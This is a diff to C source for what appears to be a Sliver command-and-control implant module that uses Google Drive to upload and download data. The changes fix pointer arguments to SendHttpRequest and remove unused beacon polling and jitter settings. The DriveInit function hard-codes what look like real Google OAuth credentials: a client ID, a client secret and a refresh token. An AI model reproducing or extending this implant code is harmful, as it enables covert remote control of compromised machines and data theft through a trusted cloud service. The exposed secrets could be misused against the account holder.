@@ -22,7 +22,7 @@ BOOL RefreshAccessToken
 	SecureZeroMemory(lpBody, sizeof(lpBody));
 	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
 	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
-	pHttpResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
+	pHttpResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
 	if (pHttpResp == NULL) {
 		goto CLEANUP;
 	}
@@ -54,8 +54,6 @@ PSLIVER_DRIVE_CLIENT DriveInit()
 	PSLIVER_DRIVE_CLIENT lpResult = NULL;
 	PHTTP_REQUEST pHttpReq = NULL;
 
-	DWORD dwPollInterval = 60;
-	DWORD dwJitter = 30;
 	CHAR szClientId[] = "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com";
 	CHAR szClientSecret[] = "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";
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
@@ -278,7 +276,7 @@ BOOL DriveUpload
 			continue;
 		}
 		
-		pResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
+		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
 		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
 			FreeHttpResp(pResp);
 			continue;
@@ -338,7 +336,7 @@ BOOL GetFileId
 		goto CLEANUP;
 	}
 
-	pResp = SendHttpRequest(pDriveClient, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
+	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -431,7 +429,7 @@ PBUFFER DriveDownload
 			continue;
 		}
 
-		pResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
+		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
 		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 			FreeHttpResp(pResp);
 			continue;
